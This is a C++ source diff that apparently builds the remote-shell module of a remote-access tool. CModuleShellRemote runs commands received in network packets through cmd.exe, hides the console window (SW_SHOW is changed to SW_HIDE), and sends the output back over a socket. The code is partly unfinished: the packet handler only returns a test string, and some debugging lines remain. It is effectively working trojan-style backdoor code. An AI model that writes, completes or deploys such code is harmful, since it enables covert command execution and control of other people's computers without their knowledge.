@@ -3,8 +3,37 @@
 #include "SocketClient.h"
 
 
+CModuleShellRemote::CModuleShellRemote(CSocketClient* pSocketClient) : CModule(pSocketClient) {
 
-DWORD cmd_ctrl_shell(CSocketClient* pClient, WCHAR* pszCommand)
+}
+
+
+CModuleShellRemote::~CModuleShellRemote() {
+
+}
+
+
+
+void CModuleShellRemote::OnRecvivePacket(CPacket* pPacket) {
+	switch (pPacket->m_PacketHead.wCommandId) {
+		
+	case SHELL_EXECUTE: {
+		//MessageBox(0, (WCHAR*)pPacket->m_pbPacketBody, L"", 0);
+		//ExecuteShell((WCHAR*)pPacket->m_pbPacketBody);
+
+		WCHAR pszData[30] = L"I am the test!";
+		pPacket->m_pSocketClient->SendPacket(SHELL_EXECUTE, (PBYTE)pszData, 30);
+		break;
+	}
+		
+
+	case SHELL_CLOSE:
+		break;
+	}
+}
+
+
+DWORD CModuleShellRemote::ExecuteShell(WCHAR* pszCommand)
 {
 	//CTcpTran m_tcptran;
 
@@ -12,9 +41,9 @@ DWORD cmd_ctrl_shell(CSocketClient* pClient, WCHAR* pszCommand)
 	PROCESS_INFORMATION pi;
 	HANDLE hRead = NULL, hWrite = NULL;
 
-	WCHAR pszSystemPath[300] = { 0 };     //命令行缓冲
-	char SendBuf[2048] = { 0 };    //发送缓冲
-	SECURITY_ATTRIBUTES sa;     //安全描述符
+	WCHAR pszSystemPath[300] = { 0 };		//命令行缓冲
+	char SendBuf[2048] = { 0 };				//发送缓冲
+	SECURITY_ATTRIBUTES sa;					//安全描述符
 	DWORD bytesRead = 0;
 	int ret = 0;
 	WCHAR pszExecuteCommand[512];			// 执行的完整命令
@@ -25,18 +54,15 @@ DWORD cmd_ctrl_shell(CSocketClient* pClient, WCHAR* pszCommand)
 
 	//创建匿名管道
 	if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
-		goto Clean;//失败
-	}
-	else {
-		// printf("创建管道成功\n");
+		goto Clean;
 	}
 
 	si.cb = sizeof(STARTUPINFO);
 	GetStartupInfo(&si);
 	si.hStdError = hWrite;
-	si.hStdOutput = hWrite;    //进程（cmd）的输出写入管道
-   // si.wShowWindow=SW_HIDE;
-	si.wShowWindow = SW_SHOW;
+	si.hStdOutput = hWrite;					//进程（cmd）的输出写入管道
+	si.wShowWindow=SW_HIDE;
+	//si.wShowWindow = SW_SHOW;
 	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
 
 	GetSystemDirectory(pszSystemPath, sizeof(pszSystemPath));   //获取系统目录
@@ -47,17 +73,18 @@ DWORD cmd_ctrl_shell(CSocketClient* pClient, WCHAR* pszCommand)
 	StringCbPrintf(pszExecuteCommand, 512, L"%s\\cmd.exe /c %s", pszSystemPath, pszCommand);
 
 	//wprintf(L"执行命令：%ws\n", pszSystemPath);
-	MessageBox(0, pszExecuteCommand, L"", 0);
+	//MessageBox(0, pszExecuteCommand, L"", 0);
 
 	//创建进程，也就是执行cmd命令
-	if (!CreateProcess(NULL, pszSystemPath, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {
+	if (!CreateProcess(NULL, pszExecuteCommand, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {
+		printf("error = 0x%x\n", GetLastError());
 		goto Clean;//失败
 	}
 	else {
 		// printf("创建进程成功\n");
 	}
 
-	CloseHandle(hWrite);
+	//CloseHandle(hWrite);
 
 	while (TRUE)
 	{
@@ -70,6 +97,7 @@ DWORD cmd_ctrl_shell(CSocketClient* pClient, WCHAR* pszCommand)
 		//}
 		bool bReadSuccess = ReadFile(hRead, SendBuf, sizeof(SendBuf), &bytesRead, NULL);
 		// printf("缓冲区有%d字节数据\n", dwReadCount);
+		//MessageBox(0, L"", L"", 0);
 		if (!bReadSuccess) {
 			break;
 		}
@@ -77,7 +105,8 @@ DWORD cmd_ctrl_shell(CSocketClient* pClient, WCHAR* pszCommand)
 			/*for (int i = 0; i < bytesRead; i++) {
 				printf("%c", SendBuf[i]);
 			}*/
-			pClient->SendPacket(SHELL_EXECUTE, (PBYTE)SendBuf, bytesRead);
+			BOOL bRet = m_pChildSocketClient->SendPacket(SHELL_EXECUTE, (PBYTE)SendBuf, bytesRead);
+			printf("???!!!!!!%d\n", m_pChildSocketClient->m_pTcpPackClient->IsConnected());
 		}
 
 		memset(SendBuf, 0, sizeof(SendBuf));  //缓冲清零
